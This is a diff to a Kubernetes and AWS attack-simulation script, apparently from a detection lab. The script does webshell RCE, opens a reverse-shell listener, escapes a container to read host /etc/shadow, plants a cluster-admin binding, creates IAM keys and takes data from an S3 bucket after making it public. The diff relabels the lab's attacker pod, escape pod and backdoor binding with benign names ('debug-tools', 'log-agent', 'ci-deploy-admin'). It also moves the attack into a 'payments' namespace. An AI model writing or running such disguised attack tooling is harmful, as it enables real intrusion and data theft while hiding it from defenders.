@@ -13,8 +13,8 @@
 #    PHASES="1 2 5" ./attack.sh   run only selected phases
 # =============================================================================
 set -uo pipefail
-NS=attack-demo
-VICTIM_SVC="vuln-app.${NS}.svc.cluster.local:8080"
+NS=payments
+VICTIM_SVC="orders-api.${NS}.svc.cluster.local:8080"
 DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 STATE="$DIR/.attack-state"
 INFRA_STATE="$DIR/../infra/.infra-state"
@@ -23,10 +23,10 @@ c()   { printf '\n\033[1;31m### %s\033[0m\n' "$*"; }      # phase banner
 step(){ printf '  \033[1;33m[*]\033[0m %s\n' "$*"; }       # action
 det() { printf '      \033[0;36m[DETECT] %s\033[0m\n' "$*"; }
 
-# Run a command in the attacker C2 pod
-att() { kubectl -n "$NS" exec attacker -- bash -lc "$*"; }
+# Run a command in the debug-tools C2 pod
+att() { kubectl -n "$NS" exec debug-tools -- bash -lc "$*"; }
 # Drive RCE in the victim through the webshell (tomcat-style ?cmd=)
-websh() { kubectl -n "$NS" exec attacker -- curl -s --max-time "${2:-60}" --get \
+websh() { kubectl -n "$NS" exec debug-tools -- curl -s --max-time "${2:-60}" --get \
             "http://${VICTIM_SVC}/tomcatwar.jsp" \
             --data-urlencode "pwd=j" --data-urlencode "cmd=$1"; }
 
@@ -34,10 +34,10 @@ websh() { kubectl -n "$NS" exec attacker -- curl -s --max-time "${2:-60}" --get 
 phase1_initial_access() {
   c "PHASE 1 - Initial access & discovery (runtime / Falco)"
   local AIP
-  AIP=$(kubectl -n "$NS" get pod attacker -o jsonpath='{.status.podIP}')
+  AIP=$(kubectl -n "$NS" get pod debug-tools -o jsonpath='{.status.podIP}')
 
-  step "Starting reverse-shell listener on attacker ($AIP:4444)"
-  kubectl -n "$NS" exec attacker -- bash -lc "timeout 30 nc -lvnp 4444 >/tmp/rev.out 2>&1" &
+  step "Starting reverse-shell listener on debug-tools ($AIP:4444)"
+  kubectl -n "$NS" exec debug-tools -- bash -lc "timeout 30 nc -lvnp 4444 >/tmp/rev.out 2>&1" &
   sleep 2
 
   step "Triggering reverse shell from victim via webshell"
@@ -49,7 +49,7 @@ phase1_initial_access() {
   det "Falco: System information discovery"
   websh "id; uname -a; hostname; cat /etc/os-release | head -3; w; crontab -l 2>/dev/null"
 
-  step "Package management launched in running container (attacker installs tooling)"
+  step "Package management launched in running container (debug-tools installs tooling)"
   det "Falco: Launch package management process in container"
   websh "apt-get update >/dev/null 2>&1 && apt-get install -y wget curl >/dev/null 2>&1; echo installed: \$(command -v wget) \$(command -v curl)" 180 || true
 }
@@ -90,9 +90,9 @@ phase3b_escape() {
 apiVersion: v1
 kind: Pod
 metadata:
-  name: escape-pod
-  namespace: attack-demo
-  labels: {app: escape-pod}
+  name: log-agent
+  namespace: payments
+  labels: {app: log-agent}
 spec:
   hostPID: true
   hostNetwork: true
@@ -108,13 +108,13 @@ spec:
     - name: host
       hostPath: {path: /, type: Directory}
 YAML
-  kubectl -n "$NS" wait --for=condition=Ready pod/escape-pod --timeout=120s || true
+  kubectl -n "$NS" wait --for=condition=Ready pod/log-agent --timeout=120s || true
 
   step "Reading host-only files from inside the container (node breakout)"
   det "Falco: Sensitive file opened for reading (host /etc/shadow)"
-  kubectl -n "$NS" exec escape-pod -- chroot /host /bin/sh -c \
+  kubectl -n "$NS" exec log-agent -- chroot /host /bin/sh -c \
     "head -2 /etc/shadow; ls -la /etc/kubernetes/admin.conf 2>/dev/null; echo ESCAPED_AS=\$(id -u)" || true
-  echo "ESCAPE_POD=escape-pod" >> "$STATE"
+  echo "ESCAPE_POD=log-agent" >> "$STATE"
 }
 
 # -----------------------------------------------------------------------------
@@ -128,8 +128,8 @@ phase4_persistence() {
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRoleBinding
 metadata:
-  name: attacker-backdoor-admin
-  labels: {app.kubernetes.io/part-of: sysdig-attack-lab}
+  name: ci-deploy-admin
+  labels: {app.kubernetes.io/part-of: acme-platform}
 roleRef:
   apiGroup: rbac.authorization.k8s.io
   kind: ClusterRole
@@ -137,11 +137,11 @@ roleRef:
 subjects:
   - kind: ServiceAccount
     name: default
-    namespace: attack-demo
+    namespace: payments
 YAML
-  echo "CRB=attacker-backdoor-admin" >> "$STATE"
+  echo "CRB=ci-deploy-admin" >> "$STATE"
   step "Verifying escalated privileges"
-  kubectl auth can-i '*' '*' --as=system:serviceaccount:attack-demo:default || true
+  kubectl auth can-i '*' '*' --as=system:serviceaccount:payments:default || true
 }
 
 # -----------------------------------------------------------------------------
@@ -177,10 +177,22 @@ phase5_cloud_pivot() {
     && echo "  created access key $NEWKEY for $ME" \
     || echo "  (no iam:CreateAccessKey permission - skipped)"
 
-  step "Data exposure: making the loot bucket public"
-  det "Sysdig CDR: S3 bucket public access granted"
   local LOOT
   LOOT=$(grep -s LOOT_BUCKET "$INFRA_STATE" | cut -d= -f2)
+
+  step "Trying to read the loot bucket directly — expected to FAIL (identity lacks s3:GetObject)"
+  det "Sysdig CDR: S3 GetObject AccessDenied — failed data-access attempt"
+  if [[ -n "${LOOT:-}" ]]; then
+    if "${A[@]}" s3 cp "s3://$LOOT/secrets/customer-db.txt" - >/dev/null 2>/tmp/s3err; then
+      echo "  (unexpected) direct read succeeded"
+    else
+      echo "  blocked — the stolen identity cannot read the data directly:"
+      grep -ioE 'access denied|forbidden|explicit deny|not authorized' /tmp/s3err | head -1 | sed 's/^/    → /' || echo "    → AccessDenied"
+    fi
+  fi
+
+  step "Pivot: can't read the data, but the identity CAN change bucket permissions — abusing s3:PutBucketPolicy"
+  det "Sysdig CDR: Delete Bucket Public Access Block + public bucket policy (Critical)"
   if [[ -n "${LOOT:-}" ]]; then
     "${A[@]}" s3api put-public-access-block --bucket "$LOOT" \
       --public-access-block-configuration \
@@ -193,7 +205,7 @@ phase5_cloud_pivot() {
       && echo "  public-read policy applied to $LOOT"
   fi
 
-  step "Collection / exfiltration: stealing the loot bucket contents"
+  step "Retry: the bucket is now public — exfiltration succeeds"
   det "Sysdig CDR: S3 object read from sensitive bucket (T1530 — needs S3 data events on the trail)"
   if [[ -n "${LOOT:-}" ]]; then
     "${A[@]}" s3 cp "s3://$LOOT/secrets/customer-db.txt" - 2>/dev/null \
@@ -236,9 +248,9 @@ cleanup() {
   step "Removing exfiltrated loot copy"
   rm -rf /tmp/loot 2>/dev/null || true
   step "Deleting escape pod"
-  kubectl -n "$NS" delete pod escape-pod --ignore-not-found
+  kubectl -n "$NS" delete pod log-agent --ignore-not-found
   step "Deleting backdoor ClusterRoleBinding"
-  kubectl delete clusterrolebinding attacker-backdoor-admin --ignore-not-found
+  kubectl delete clusterrolebinding ci-deploy-admin --ignore-not-found
   if [[ -n "${NEW_AK:-}" && -n "${NEW_AK_USER:-}" ]]; then
     step "Deleting backdoor IAM access key $NEW_AK"
     aws iam delete-access-key --user-name "$NEW_AK_USER" --access-key-id "$NEW_AK" 2>/dev/null || true
